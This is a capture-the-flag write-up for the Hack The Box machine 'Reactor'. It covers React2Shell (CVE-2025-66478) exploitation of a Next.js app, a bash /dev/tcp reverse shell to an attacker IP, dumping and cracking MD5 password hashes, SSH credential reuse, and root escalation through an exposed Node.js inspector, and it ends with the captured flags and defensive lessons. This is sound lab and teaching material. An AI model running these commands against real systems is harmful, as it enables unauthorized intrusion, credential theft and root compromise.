# Hack The Box — Reactor Writeup

> **Active-machine material — private only. Do not publish until Reactor has retired.**

## Overview

| Field | Value |
| --- | --- |
| Machine | Reactor |
| Platform | Hack The Box |
| Season | 11 |
| OS | Linux |
| Difficulty | Medium/Hard |

Main techniques:

- Next.js and React Server Components fingerprinting
- React2Shell / CVE-2025-66478 exploitation
- SQLite database extraction and raw MD5 cracking
- SSH lateral movement
- Node.js V8 Inspector abuse for privilege escalation

## 1. Reconnaissance

Start with a full TCP scan:

```bash
nmap -sV -Pn -p- -T5 10.129.7.23
```

```text
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu
3000/tcp open  http    Next.js application
```

Port `3000` exposes **ReactorWatch Core Monitoring System**:

```bash
curl -i http://10.129.7.23:3000/
```

Relevant response headers:

```http
HTTP/1.1 200 OK
Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch, Accept-Encoding
x-nextjs-cache: HIT
x-nextjs-prerender: 1
x-nextjs-stale-time: 4294967294
X-Powered-By: Next.js
Content-Type: text/html; charset=utf-8
```

The source also references `/_next/static/chunks/...`. The header and assets identify Next.js, while `Vary: RSC...` points specifically to React Server Components behavior.

## 2. Confirming the RSC and Server Actions surface

Send an explicit RSC request:

```bash
curl -i http://10.129.7.23:3000/ \
  -H 'RSC: 1' \
  -H 'Next-Router-Prefetch: 1'
```

The response uses `Content-Type: text/x-component` and contains an RSC payload:

```text
2:"$Sreact.fragment"
3:I[5244,[],""]
...
```

Inspect the client-side chunks for the Server Actions runtime:

```bash
for js in $(curl -s http://10.129.7.23:3000/ | grep -oE '/_next/static/[^\"]+\.js' | sort -u); do
  echo "===== $js ====="
  curl -s "http://10.129.7.23:3000$js" \
    | grep -oiE 'Next-Action|next-action|server-action|server reference|callServer|encodeReply|decodeReply|react-server-dom-webpack|server-reference|use server' \
    | sort -u
done
```

```text
===== /_next/static/chunks/517-d083b552e04dead1.js =====
callServer
encodeReply
Next-Action
server-action
use server
```

The reasoning chain is:

```text
Next.js detected
+ RSC headers present
+ text/x-component response to an RSC request
+ Server Actions strings in client chunks
= React Server Components / Server Actions attack surface
```

This does not prove RCE, but it makes testing React2Shell / CVE-2025-66478 a justified next step.

## 3. React2Shell confirmation and initial RCE

Validate the hypothesis with a scanner before exploitation:

```bash
python3 scanner.py -u http://10.129.7.23:3000/
```

```text
[VULNERABLE] http://10.129.7.23:3000/ - Status: 303
```

Use a public proof of concept and begin with a harmless command:

```text
TARGET URL > http://10.129.7.23:3000/
COMMAND > id
uid=999(node) gid=988(node) groups=988(node)
```

This confirms unauthenticated command execution as `node`. Start a listener and execute a reverse shell:

```bash
nc -lvnp 4444
bash -i >& /dev/tcp/10.10.14.96/4444 0>&1
```

```text
node@reactor:/opt/reactor-app$
```

## 4. Local enumeration as `node`

```bash
ls
```

```text
app
next.config.js
node_modules
package.json
package-lock.json
reactor.db
```

Query the SQLite database rather than treating it as a text file:

```bash
sqlite3 reactor.db '.tables'
sqlite3 reactor.db 'SELECT id, username, password_hash, role, email FROM users;'
```

```text
engineer : 39d97110eafe2a9a68639812cd271e8e
/admin   : a203b22191d744a4e70ada5c101b17b8a
```

The `engineer` value is a 32-character hexadecimal digest, strongly suggesting raw MD5.

## 5. Cracking the engineer hash

```bash
echo '39d97110eafe2a9a68639812cd271e8e' > engineer.hash
hashcat -m 0 -a 0 engineer.hash /usr/share/wordlists/rockyou.txt
```

John the Ripper is an alternative:

```bash
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt engineer.hash
john --show --format=raw-md5 engineer.hash
```

Reuse the recovered credentials over SSH:

```bash
ssh engineer@10.129.7.23
cat user.txt
```

```text
4cc5b831617fa3cde7b4e65fdcf54ac8
```

## 6. Privilege-escalation enumeration

Standard checks reveal no useful `sudo` permissions, SUID binaries, or cron jobs:

```bash
sudo -l
find / -perm -4000 2>/dev/null
cat /etc/crontab
```

Because the foothold originated from Node.js, inspect related processes and debug services:

```bash
ps auxww | grep -iE 'node|npm|next|pm2|reactor|inspect|debug' | grep -v grep
```

```text
node  1396  ... next-server (v15.0.3)
root  1398  ... /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
```

The root-owned process exposes the V8 Inspector on localhost. JavaScript evaluated inside that process inherits its root privileges.

## 7. Abusing the Node.js Inspector

Query the Inspector discovery endpoint:

```bash
curl -s http://127.0.0.1:9229/json/list
```

```json
[
  {
    "title": "/opt/uptime-monitor/worker.js",
    "type": "node",
    "webSocketDebuggerUrl": "ws://127.0.0.1:9229/74be2a6f-2899-499c-a942-f191e41ebaa4"
  }
]
```

A direct `require('child_process')` expression may fail because `require` is not always global in the Inspector context. The dependency-free client in [`tools/inspect.py`](tools/inspect.py) performs the WebSocket handshake, sends `Runtime.evaluate`, and tries several Node internals to load `child_process`.

```bash
chmod +x tools/inspect.py
tools/inspect.py 'ws://127.0.0.1:9229/74be2a6f-2899-499c-a942-f191e41ebaa4' id
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

Read the root flag:

```bash
tools/inspect.py 'ws://127.0.0.1:9229/74be2a6f-2899-499c-a942-f191e41ebaa4' 'cat /root/root.txt'
```

```text
acd9a307a2ffff33c9d2ab38db54dbbd
```

## Attack chain summary

1. Nmap discovered SSH and a web application on port `3000`.
2. Headers and static assets identified Next.js.
3. RSC headers and `text/x-component` responses confirmed React Server Components.
4. Client chunks revealed Server Actions indicators.
5. React2Shell was validated and exploited for RCE as `node`.
6. `reactor.db` exposed raw MD5 password hashes.
7. The `engineer` hash was cracked and reused for SSH access.
8. Enumeration revealed a root-owned Node process using `--inspect`.
9. V8 Inspector `Runtime.evaluate` provided command execution as root.

## Lessons learned

- `X-Powered-By: Next.js` alone is not enough to select a CVE.
- `Vary: RSC...` and `Content-Type: text/x-component` establish an RSC surface.
- `Next-Action`, `callServer`, and `use server` justify testing Server Actions vulnerabilities.
- SQLite databases in application directories are high-value enumeration targets.
- After compromising Node.js, enumerate Node processes and local debug ports.
- Never enable `node --inspect` in production, especially on a root-owned process.

## Flags

```text
user.txt: 4cc5b831617fa3cde7b4e65fdcf54ac8
root.txt: acd9a307a2ffff33c9d2ab38db54dbbd
```

